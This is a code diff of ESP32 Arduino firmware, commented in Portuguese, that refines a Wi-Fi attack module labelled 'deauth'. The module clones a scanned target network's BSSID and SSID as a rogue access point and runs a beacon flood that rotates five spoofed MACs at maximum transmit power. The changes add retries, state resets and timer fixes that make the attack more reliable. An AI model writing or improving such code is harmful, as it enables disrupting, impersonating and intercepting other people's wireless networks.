@@ -3,11 +3,6 @@
 #include "config.h"
 
 // ============================================================
-// CONFIG DEAUTH v3.1+
-// TX Power: 19.5dBm (max legal ESP32)
-// Max Clients: 8 (dobro do padrao 4)
-// ============================================================
-// ============================================================
 // CONTADORES E ESTADO
 // ============================================================
 static uint32_t deauthPacketCount = 0;
@@ -18,7 +13,7 @@ static char     deauthTargetSSID[33] = {0};
 static uint8_t  deauthTargetAuth = 0;
 
 // ============================================================
-// BSSID CLONE - METODO PRINCIPAL (funciona no Arduino)
+// BSSID CLONE
 // ============================================================
 static bool bssidCloneActive = false;
 static uint8_t originalAPMac[6] = {0};
@@ -28,12 +23,18 @@ static unsigned long cloneStartTime = 0;
 static uint8_t cloneHealthCheckFailures = 0;
 
 // ============================================================
-// BEACON FLOOD - METODO ADICIONAL
-// Cria multiplos clones com SSID igual mas MACs diferentes
+// BEACON FLOOD
 // ============================================================
 static bool beaconFloodActive = false;
 static uint8_t floodIndex = 0;
 static uint8_t floodMacs[5][6];
+
+// ============================================================
+// TIMERS DO DEAUTH LOOP (globais para poder resetar no start)
+// ============================================================
+static unsigned long deauthLastHealthCheck = 0;
+static unsigned long deauthLastFloodStep = 0;
+static unsigned long deauthLastDebug = 0;
 
 // ============================================================
 // HELPERS
@@ -64,6 +65,7 @@ void scanNetworks() {
     networkCount = 0;
     if (WiFi.getMode() != WIFI_STA) {
         WiFi.mode(WIFI_STA);
+        delay(200);
     }
     delay(100);
 
@@ -102,6 +104,11 @@ static void startBssidClone(uint8_t networkIndex) {
 
     NetworkInfo* target = &scannedNetworks[networkIndex];
 
+    // ZERA CONTADORES SEMPRE no inicio — independente de dar certo ou nao
+    deauthPacketCount = 0;
+    deauthSuccessCount = 0;
+    cloneHealthCheckFailures = 0;
+
     memcpy(deauthTargetBSSID, target->bssid, 6);
     strncpy(deauthTargetSSID, target->ssid, 32);
     deauthTargetSSID[32] = '\0';
@@ -118,33 +125,52 @@ static void startBssidClone(uint8_t networkIndex) {
         target->bssid[0], target->bssid[1], target->bssid[2],
         target->bssid[3], target->bssid[4], target->bssid[5]);
 
+    // === RESET COMPLETO DO WIFI ===
     WiFi.softAPdisconnect(true);
-    delay(300);
+    delay(500);
+    WiFi.mode(WIFI_OFF);
+    delay(500);
 
     WiFi.mode(WIFI_AP_STA);
-    delay(200);
+    delay(300);
 
-    esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, target->bssid);
+    // === TENTA SETAR MAC COM RETRY ===
+    esp_err_t macErr = ESP_FAIL;
+    for (int retry = 0; retry < 3; retry++) {
+        macErr = esp_wifi_set_mac(WIFI_IF_AP, target->bssid);
+        if (macErr == ESP_OK) break;
+        Serial.printf("[Clone] MAC retry %d...\n", retry + 1);
+        delay(200);
+    }
     Serial.printf("[Clone] Set AP MAC result: %d (%s)\n", macErr, macErr == ESP_OK ? "OK" : "FAIL");
-    delay(200);
+    delay(300);
 
-    bool apOk = WiFi.softAP(cloneSSID, nullptr, cloneChannel, 0, 8);
-        WiFi.setTxPower(WIFI_POWER_19_5dBm);
-    Serial.printf("[Clone] softAP result: %s\n", apOk ? "OK" : "FAIL");
+    // === TENTA INICIAR softAP COM RETRY ===
+    bool apOk = false;
+    for (int retry = 0; retry < 3; retry++) {
+        apOk = WiFi.softAP(cloneSSID, nullptr, cloneChannel, 0, 8);
+        if (apOk) break;
+        Serial.printf("[Clone] softAP retry %d...\n", retry + 1);
+        delay(300);
+    }
 
     if (apOk) {
+        WiFi.setTxPower(WIFI_POWER_19_5dBm);
         WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-        
+
         bssidCloneActive = true;
         deauthActive = true;
         cloneStartTime = millis();
-        cloneHealthCheckFailures = 0;
-        deauthPacketCount = 0;
-        deauthSuccessCount = 0;
-        
+
+        // RESETA TIMERS para nao disparar health check imediato
+        deauthLastHealthCheck = millis();
+        deauthLastFloodStep = millis();
+        deauthLastDebug = millis();
+
         Serial.println("[Clone] BSSID CLONE ACTIVE");
     } else {
         Serial.println("[Clone] FAILED to start clone AP");
+        WiFi.mode(WIFI_STA);
     }
 }
 
@@ -153,20 +179,20 @@ static void startBssidClone(uint8_t networkIndex) {
 // ============================================================
 static void restartBssidClone() {
     if (!bssidCloneActive) return;
-    
+
     Serial.println("[Clone] Health check failed, restarting clone...");
-    
+
     WiFi.softAPdisconnect(true);
     delay(300);
-    
+
     WiFi.mode(WIFI_AP_STA);
     delay(200);
-    
+
     esp_wifi_set_mac(WIFI_IF_AP, deauthTargetBSSID);
     delay(200);
-    
+
     bool apOk = WiFi.softAP(cloneSSID, nullptr, cloneChannel, 0, 8);
-        WiFi.setTxPower(WIFI_POWER_19_5dBm);
+    WiFi.setTxPower(WIFI_POWER_19_5dBm);
     if (apOk) {
         WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
         cloneHealthCheckFailures = 0;
@@ -181,7 +207,16 @@ static void restartBssidClone() {
 // BSSID CLONE - PARA
 // ============================================================
 static void stopBssidClone() {
-    if (!bssidCloneActive) return;
+    if (!bssidCloneActive && !isSoftAPActive()) {
+        // Mesmo se nao estiver "ativo", garante estado limpo
+        WiFi.softAPdisconnect(true);
+        delay(300);
+        WiFi.mode(WIFI_OFF);
+        delay(300);
+        WiFi.mode(WIFI_STA);
+        delay(200);
+        return;
+    }
 
     Serial.println("[Clone] Stopping BSSID clone...");
 
@@ -191,6 +226,9 @@ static void stopBssidClone() {
     esp_wifi_set_mac(WIFI_IF_AP, originalAPMac);
     delay(200);
 
+    // RESET COMPLETO
+    WiFi.mode(WIFI_OFF);
+    delay(300);
     WiFi.mode(WIFI_STA);
     delay(200);
 
@@ -200,19 +238,19 @@ static void stopBssidClone() {
 }
 
 // ============================================================
-// BEACON FLOOD - ALTERNA ENTRE 5 MACs DIFERENTES
+// BEACON FLOOD
 // ============================================================
 static void startBeaconFlood(uint8_t networkIndex) {
     if (networkIndex >= networkCount) return;
-    
+
     NetworkInfo* target = &scannedNetworks[networkIndex];
-    
+
     Serial.printf("[Flood] Starting beacon flood for: %s\n", target->ssid);
-    
+
     for (int i = 0; i < 5; i++) {
         generateMac(floodMacs[i], i + 1);
     }
-    
+
     beaconFloodActive = true;
     floodIndex = 0;
 }
@@ -223,17 +261,17 @@ static void stopBeaconFlood() {
 
 static void beaconFloodStep() {
     if (!beaconFloodActive) return;
-    
+
     WiFi.softAPdisconnect(true);
     delay(100);
-    
+
     esp_wifi_set_mac(WIFI_IF_AP, floodMacs[floodIndex]);
     delay(100);
-    
+
     WiFi.softAP(cloneSSID, nullptr, cloneChannel, 0, 8);
     WiFi.setTxPower(WIFI_POWER_19_5dBm);
     delay(100);
-    
+
     floodIndex = (floodIndex + 1) % 5;
 }
 
@@ -247,9 +285,13 @@ void startDeauth(uint8_t networkIndex) {
     }
 
     startBssidClone(networkIndex);
-    startBeaconFlood(networkIndex);
 
-    Serial.println("[Deauth] STARTED (BSSID Clone + Beacon Flood)");
+    if (bssidCloneActive) {
+        startBeaconFlood(networkIndex);
+        Serial.println("[Deauth] STARTED (BSSID Clone + Beacon Flood)");
+    } else {
+        Serial.println("[Deauth] FAILED: clone did not start");
+    }
 }
 
 void stopDeauth() {
@@ -265,7 +307,7 @@ void stopDeauth() {
 }
 
 // ============================================================
-// LOOP DE DEAUTH - SEM frame injection (quebrava o driver)
+// LOOP DE DEAUTH
 // ============================================================
 bool deauthLoop() {
     if (!deauthActive) return false;
@@ -274,10 +316,9 @@ bool deauthLoop() {
     deauthSuccessCount++;
 
     // === HEALTH CHECK a cada 3 segundos ===
-    static unsigned long lastHealthCheck = 0;
-    if (millis() - lastHealthCheck > 3000) {
-        lastHealthCheck = millis();
-        
+    if (millis() - deauthLastHealthCheck > 3000) {
+        deauthLastHealthCheck = millis();
+
         if (!isSoftAPActive()) {
             Serial.println("[Clone] WARN: softAP not active!");
             cloneHealthCheckFailures++;
@@ -297,16 +338,14 @@ bool deauthLoop() {
     }
 
     // === BEACON FLOOD step a cada 500ms ===
-    static unsigned long lastFloodStep = 0;
-    if (beaconFloodActive && (millis() - lastFloodStep > 500)) {
-        lastFloodStep = millis();
+    if (beaconFloodActive && (millis() - deauthLastFloodStep > 500)) {
+        deauthLastFloodStep = millis();
         beaconFloodStep();
     }
 
     // === Debug a cada 5 segundos ===
-    static unsigned long lastDebug = 0;
-    if (millis() - lastDebug > 5000) {
-        lastDebug = millis();
+    if (millis() - deauthLastDebug > 5000) {
+        deauthLastDebug = millis();
         int clients = WiFi.softAPgetStationNum();
         Serial.printf("[Deauth] runtime=%lus clone=%s clients=%d health_fail=%d\n",
             (millis() - cloneStartTime) / 1000,
